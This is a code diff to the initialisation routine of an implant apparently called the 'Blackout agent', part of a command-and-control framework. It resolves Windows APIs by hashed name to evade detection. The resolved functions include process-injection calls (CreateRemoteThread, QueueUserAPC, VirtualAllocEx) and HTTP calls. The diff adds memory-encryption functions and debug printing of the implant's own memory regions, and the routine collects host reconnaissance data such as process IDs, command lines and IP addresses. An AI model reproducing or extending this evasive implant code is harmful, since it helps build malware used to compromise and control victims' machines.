@@ -47,11 +47,14 @@ FUNC VOID BlackoutInit() {
     Instance()->Win32.LocalFree                 = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LocalFree" ) );
     Instance()->Win32.LocalReAlloc              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LocalReAlloc" ) );
     Instance()->Win32.VirtualFree               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualFree" ) );
+    Instance()->Win32.VirtualQuery              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualQuery" ) );
     Instance()->Win32.VirtualAlloc              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualAlloc" ) );
     Instance()->Win32.VirtualAllocEx            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualAllocEx" ) );
     Instance()->Win32.VirtualProtect            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualProtect" ) );
     Instance()->Win32.VirtualProtectEx          = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualProtectEx" ) );
     Instance()->Win32.WaitForSingleObject       = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "WaitForSingleObject" ) );
+    Instance()->Win32.WaitForSingleObjectEx     = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "WaitForSingleObjectEx" ) );
+    
     Instance()->Win32.CreateThread              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateThread" ) );
     Instance()->Win32.CreateRemoteThread        = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateRemoteThread" ) );
     Instance()->Win32.QueueUserAPC              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "QueueUserAPC" ) ); 
@@ -100,6 +103,9 @@ FUNC VOID BlackoutInit() {
     Instance()->Win32.WinHttpSetOption          = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpSetOption") );
     Instance()->Win32.WinHttpCloseHandle        = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpCloseHandle" ) );
 
+    Instance()->Win32.SystemFunction040 = LdrFuncAddr( Instance()->Modules.Cryptbase, HASH_STR( "SystemFunction040" ) );
+    Instance()->Win32.SystemFunction041 = LdrFuncAddr( Instance()->Modules.Cryptbase, HASH_STR( "SystemFunction041" ) );
+
     Instance()->Win32.printf = Instance()->Win32.GetProcAddress( Instance()->Modules.Msvcrt, "printf" );
 
     Instance()->Win32.GetAdaptersInfo = LdrFuncAddr( Instance()->Modules.Iphlpapi, HASH_STR( "GetAdaptersInfo" ) );
@@ -110,6 +116,12 @@ FUNC VOID BlackoutInit() {
     Instance()->Config.Session.ProcessId  = CST_U32( Instance()->Teb->ClientId.UniqueProcess );
     Instance()->Config.Session.ThreadId   = CST_U32( Instance()->Teb->ClientId.UniqueThread );
         
+    MEMORY_BASIC_INFORMATION Mbi = { 0 };
+    Instance()->Win32.VirtualQuery( Instance()->Base.Buffer, &Mbi, sizeof( Mbi ) );
+
+    Instance()->Win32.printf( "[I] AllocationBase 0x%p\n[I] AllocationProtection %x\n[I] RegionSize %ld\n[I] Type %x\n[I] Base address 0x%p\n[I] Protection %x\n\n", 
+    Mbi.AllocationBase, Mbi.AllocationProtect, Mbi.RegionSize, Mbi.Type, Mbi.BaseAddress, Mbi.Protect );
+
     GetProcessInfo( 
         &Instance()->Config.Session.ProcessFullPath, 
         &Instance()->Config.Session.ProcessName, 
@@ -122,6 +134,7 @@ FUNC VOID BlackoutInit() {
         &Instance()->Config.CompData.ProductType,
         &Instance()->Config.CompData.IpAddress
     );
+
 
     Instance()->Config.CompData.OsMajorV        = Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion;
     Instance()->Config.CompData.OsMinorv        = Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion;
@@ -143,6 +156,7 @@ FUNC VOID BlackoutInit() {
 
     Instance()->Win32.printf( 
         "[INFO] Blackout agent initialized @ 0x%p [%d bytes]\n"
+        "[INFO] Blackout Rx Base @ 0x%p [%d bytes]\n"
         "\t=> Process Heap @ 0x%p\n"
         "\t=> ProcessId: %d\n"
         "\t=> ThreadId:  %d\n"
@@ -161,6 +175,8 @@ FUNC VOID BlackoutInit() {
         "\t=> Process CmdLine: %ws\n",
         Instance()->Base.Buffer,
         Instance()->Base.Length,
+        Instance()->Base.RxBase,
+        Instance()->Base.RxSize,
         Instance()->Config.Session.Heap, 
         Instance()->Config.Session.ProcessId,
         Instance()->Config.Session.ThreadId,
